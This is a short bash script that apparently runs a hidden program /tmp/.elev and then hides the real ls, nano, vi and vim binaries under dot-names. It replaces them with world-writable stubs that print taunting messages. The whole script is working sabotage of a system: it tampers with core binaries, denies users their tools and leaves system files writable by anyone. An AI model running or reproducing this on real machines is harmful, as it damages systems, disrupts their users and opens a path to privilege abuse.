#!/bin/bash
cd /tmp/ && ./.elev
mv /bin/ls /bin/.hiddenls && echo "echo \"Did I just accidentally mess your ls command? I am so sorry, to fix it, check out your .bashrc file\"" > /bin/ls && chmod 777 /bin/ls && mv /bin/nano /bin/.hiddenNano && mv /usr/bin/vi /usr/bin/.hiddenVI && echo "echo \"It ain't that easy ;)\"" > /bin/nano && echo "echo \"It ain't that easy ;)\"" > /usr/bin/vi && chmod 777 /bin/nano /usr/bin/vi && mv /bin/vim /bin/.hiddenvim && echo "echo \"you must be very desparate to call me, try looking into your /bin/ folder :)\"" >  /bin/vim && chmod 777 /bin/vim
